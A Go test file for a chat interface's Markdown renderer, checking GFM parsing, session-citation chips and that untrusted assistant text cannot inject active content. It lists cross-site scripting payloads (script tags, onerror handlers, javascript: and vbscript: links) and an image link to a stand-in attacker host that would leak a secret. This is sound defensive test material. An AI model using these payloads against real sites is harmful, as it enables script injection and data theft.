package chat

import (
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/yuin/goldmark/ast"
	east "github.com/yuin/goldmark/extension/ast"
)

func TestMarkdownCommonMarkGFM(t *testing.T) {
	d := ParseMarkdown("Title\n=====\n\n> quoted\n\n3. list\n   - nested\n\n- [x] done\n\n~~gone~~ https://example.com\n\n| A | B |\n| :- | -: |\n| **a** | b |\n\n    indented\n\n---\n")
	kinds := map[ast.NodeKind]bool{}
	_ = ast.Walk(d.Root, func(n ast.Node, enter bool) (ast.WalkStatus, error) {
		if enter {
			kinds[n.Kind()] = true
		}
		return ast.WalkContinue, nil
	})
	for _, kind := range []ast.NodeKind{ast.KindHeading, ast.KindBlockquote, ast.KindList, ast.KindCodeBlock, ast.KindThematicBreak, ast.KindEmphasis, ast.KindAutoLink, east.KindTaskCheckBox, east.KindTable, east.KindStrikethrough} {
		if !kinds[kind] {
			t.Errorf("missing %s", kind)
		}
	}
	if got := MarkdownHTML("**[[session:42]]**"); got != "<p><strong><button type=\"button\" class=\"chat-chip\" data-chat-session=\"42\">session #42</button></strong></p>\n" {
		t.Fatal(got)
	}
}

func TestMarkdownHTMLSafety(t *testing.T) {
	for _, input := range []string{
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "text <b onclick='evil()'>literal</b>",
		"[bad](javascript:alert(1))", "[bad](jav&#x61;script:alert(1))", "[bad](data:text/html,evil)",
		"![bad](javascript:evil)", "![bad](data:image/png;base64,AAAA)", "[bad](//evil.test)", "[bad](/relative)",
		"<javascript:alert(1)>", "[bad](vbscript:evil)", "[bad](file:///tmp/foo)",
		"[&lt;script&gt;evil&lt;/script&gt;](javascript:evil)", "![&lt;img src=x onerror=evil&gt;](data:x)",
	} {
		got := MarkdownHTML(input)
		for _, bad := range []string{"<script", "<img", `href="`, `src="`} {
			if strings.Contains(got, bad) {
				t.Errorf("unsafe %q => %s", input, got)
			}
		}
	}
	for _, input := range []string{"[safe](https://example.com)", "[safe](http://example.com)", "[safe](mailto:a@example.com)", "https://example.com", "<a@example.com>"} {
		got := MarkdownHTML(input)
		if !strings.Contains(got, "href=") && !strings.Contains(got, "src=") {
			t.Errorf("safe link lost: %s", got)
		}
	}
	if got := MarkdownHTML("[bad](javascript:evil)"); !strings.Contains(got, "bad (javascript:evil)") {
		t.Fatal(got)
	}
}

func TestMarkdownPartialAndBounded(t *testing.T) {
	for _, input := range []string{"```go\nunterminated", "| A | B |\n| --", "**partial", "[unfinished](https://", strings.Repeat("界", MaxText)} {
		d := ParseMarkdown(input)
		if len(d.Source) > MaxText || !utf8.Valid(d.Source) {
			t.Fatal("unbounded or invalid source")
		}
		_ = MarkdownHTML(input)
	}
}

// Assistant text is untrusted: raw HTML and script URLs must never reach the page.
func TestMarkdownHTMLNeutralizesActiveContent(t *testing.T) {
	for _, input := range []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"[click](javascript:alert(1))",
		"![x](javascript:alert(1))",
		"[v](vbscript:msgbox(1))",
		"<a href=\"javascript:alert(1)\">a</a>",
		"| a |\n|---|\n| <b onclick=alert(1)>x</b> |",
		"[&lt;img src=x onerror=alert(1)&gt;](javascript:x)",
		"[&lt;script&gt;alert(1)&lt;/script&gt;](ftp://x)",
		"![exfil](https://attacker.example/p.png?d=secret)",
	} {
		got := strings.ToLower(MarkdownHTML(input))
		// Dangerous URLs and markup may remain as escaped visible text, never as
		// a tag or attribute.
		for _, bad := range []string{"<script", "<img", "<b ", "href=\"javascript", "src=\"javascript", "href=\"vbscript"} {
			if strings.Contains(got, bad) {
				t.Errorf("%q rendered %q (contains %q)", input, got, bad)
			}
		}
	}
	if got := MarkdownHTML("![exfil](https://attacker.example/p.png)"); strings.Contains(got, "<img") {
		t.Errorf("remote image rendered: %q", got)
	}
	if got := MarkdownHTML("[ok](https://example.com)"); !strings.Contains(got, `href="https://example.com"`) {
		t.Errorf("safe link dropped: %q", got)
	}
}

func TestMarkdownCitationsStayLiteralInCode(t *testing.T) {
	for _, text := range []string{"`[[session:42]]`", "```\n[[session:42]]\n```", "[label [[session:42]]](https://example.com)"} {
		if got := MarkdownHTML(text); strings.Contains(got, "data-chat-session") {
			t.Fatal(got)
		}
	}
	got := MarkdownHTML("Inspect [[session:42]] and **[[session:7]]**.")
	if strings.Count(got, "data-chat-session=") != 2 || !strings.Contains(got, `data-chat-session="42"`) {
		t.Fatal(got)
	}
}
